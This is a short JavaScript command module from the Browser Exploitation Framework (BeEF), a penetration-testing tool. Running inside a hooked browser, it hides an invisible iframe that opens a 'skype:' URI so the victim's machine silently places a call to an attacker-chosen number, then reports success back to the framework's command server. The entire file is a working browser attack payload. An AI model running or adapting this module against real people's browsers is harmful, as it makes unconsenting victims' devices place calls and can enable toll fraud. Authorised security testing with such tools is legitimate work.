//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var sploit = beef.dom.createInvisibleIframe();
	sploit.src = 'skype:<%= @tel_num %>?call';
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
});
